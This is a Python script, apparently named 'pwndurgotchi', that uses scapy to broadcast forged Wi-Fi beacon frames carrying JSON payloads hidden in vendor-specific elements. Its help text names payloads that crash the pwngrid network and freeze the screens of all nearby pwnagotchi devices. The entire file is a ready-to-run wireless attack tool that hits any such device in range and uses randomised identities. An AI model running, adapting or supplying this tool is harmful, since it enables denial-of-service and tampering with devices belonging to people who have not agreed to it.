import sys
import json
import random
import getopt
from time import sleep
from hashlib import sha256
from scapy.all import (
    RadioTap,
    Dot11FCS,
    Dot11Beacon,
    Dot11Elt,
    Dot11,
    sendp,
)


def get_pwn_packet():
    return (
        RadioTap()
        / Dot11FCS(
            addr1="ff:ff:ff:ff:ff:ff",
            addr2="de:ad:be:ef:de:ad",
            addr3="be:ef:de:ad:be:ef",
        )
        / Dot11Beacon()
    )


def set_field_data(elt, data):
    elt.setfieldval("ID", 222)
    elt.setfieldval("info", data)
    elt.setfieldval("len", len(data))
    return elt


def get_payload(payload_file_path):
    try:
        f = open(payload_file_path)
        data = json.load(f)
        return data
    except:
        print("Failure to load payload")


def load_payload_into_packet(packet, payload_chunks):
    beacon_frame = packet[Dot11][Dot11Beacon]
    last_elt = beacon_frame

    for i in range(0, len(payload_chunks)):
        chunk = payload_chunks[i]
        elt = Dot11Elt()
        set_field_data(elt, chunk)
        last_elt.add_payload(elt)
        last_elt = elt


def get_random_identity():
    num = random.random()
    return sha256(str(num).encode("utf-8")).hexdigest()


def create_pwn_packet(payload_file_path, use_random_identity=True):
    payload = get_payload(payload_file_path)
    if use_random_identity:
        payload["identity"] = get_random_identity()

    payload_bytes = json.dumps(payload).encode()
    payload_chunks = [
        payload_bytes[i : i + 255] for i in range(0, len(payload_bytes), 255)
    ]

    packet = get_pwn_packet()
    load_payload_into_packet(packet, payload_chunks)

    return packet


def send_payload(
    payload_file_path,
    use_random_identity=True,
    play_count=10,
    iface="wlan0",
    sleep_time=0,
    loop_count=0,
    verbose=False,
):
    if loop_count > 0:
        for i in range(0, loop_count):
            packet = create_pwn_packet(payload_file_path, use_random_identity)
            if verbose == True:
                packet.show()
            sendp(packet, loop=0, count=play_count, iface=iface, verbose=verbose)
            if sleep_time > 0:
                sleep(sleep_time)
    else:
        packet = create_pwn_packet(payload_file_path, use_random_identity)
        if verbose == True:
            packet.show()
        sendp(packet, loop=0, count=play_count, iface=iface, verbose=verbose)


def help():
    print("pwndurgotchi 1.0")
    print("")
    print(
        "Usage: python pwndurgotchi.py [-p | --payload <path>] [-i | --interface <name>] [-c | --count <value>]"
    )
    print(
        "[-s | static_identity] [-d | --delay <value>] [-l | --loop <value>] [-v | --verbose]"
    )
    print("")
    print("-p --payload\t\tPath to the JSON payload to send")
    print(
        "-i --interface\t\tWireless interface used to send the packets (default wlan0)"
    )
    print("-c --count\t\tNumber of packets to send at a time (default 1)")
    print("-s --static_identity\tUse the static identity in each payload")
    print("-d --delay\t\tDelay time in between each loop (default 0)")
    print("-l --loop\t\tAmount of times to loop (default 0)")
    print("-v --verbose\t\tPrint logs during execution")
    print("")
    print("Requires a wireless interface in monitor mode and scapy")
    print("")
    print("Payloads:")
    print("calling_card.json\tSends a custom face & username to all nearby pwnagotchi")
    print("kill_grid.json\t\tCrashes the pwngrid network on all nearby pwnagotchi")
    print("screen_freeze.json\tFreeze the screen of all nearby pwnagotchi")
    print("")
    print("Made by BigBroDude6119")

    sys.exit(0)


def main():
    payload_file_path = ""
    iface = "wlan0"
    count = 1
    random_identity = True
    sleep_time = 0
    loop_count = 0
    verbose = False

    if not len(sys.argv[1:]):
        help()

    try:
        opts, _ = getopt.getopt(
            sys.argv[1:],
            "hp:i:c:sd:l:v",
            [
                "help",
                "payload",
                "interface",
                "count",
                "static_identity",
                "delay",
                "loop",
                "verbose",
            ],
        )
    except getopt.GetoptError as err:
        print(str(err))
        help()

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            help()
        elif opt in ("-p", "--payload"):
            payload_file_path = arg
        elif opt in ("-i", "--interface"):
            iface = arg
        elif opt in ("-c", "--count"):
            count = int(arg)
        elif opt in ("-s", "--static_identity"):
            random_identity = False
        elif opt in ("-d", "--delay"):
            sleep_time = int(arg)
        elif opt in ("-l", "--loop"):
            loop_count = int(arg)
        elif opt in ("-v", "--verbose"):
            verbose = True

    if payload_file_path:
        send_payload(
            payload_file_path,
            random_identity,
            count,
            iface,
            sleep_time,
            loop_count,
            verbose,
        )
    else:
        print("Payload path is required")
        help()


main()
